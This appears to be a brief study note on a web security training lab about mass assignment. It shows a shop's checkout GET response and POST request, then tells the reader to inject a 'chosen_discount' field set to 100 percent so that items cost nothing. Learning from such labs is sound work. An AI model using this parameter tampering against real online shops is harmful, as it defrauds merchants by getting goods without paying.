other name: **auto binding**

mass assignment vulnerability is like assigning something on too much things that misses some important access control, like that permission also gets assign to something which not supposed to

for example: add to cart something,
**GET /api/checkout/  HTTP/2**

response,

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 153

{
    "chosen_discount":
        {"percentage":0},
    "chosen_products":
        [{"product_id":"1",
        "name":"Lightweight \"l33t\" Leather Jacket",
        "quantity":1,
        "item_price":133700}]
}
```

after checking out,
post request will be like 
```
POST /api/checkout HTTP/2

Host: 0a7d00a703248fae803d672100f90025.web-security-academy.net
Cookie: session=fPG6c0rPOiNuHnOrnYuNBIUs3wV1mABA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7d00a703248fae803d672100f90025.web-security-academy.net/cart
Content-Type: text/plain;charset=UTF-8
Content-Length: 53
Origin: https://0a7d00a703248fae803d672100f90025.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
{
    "chosen_products":
        [{"product_id":"1",
        "quantity":1}]
}
```
see the difference that "chosen_discount" object is not availabe in that post request, add this in post request, if it does not throw any error than make the percentage to 100.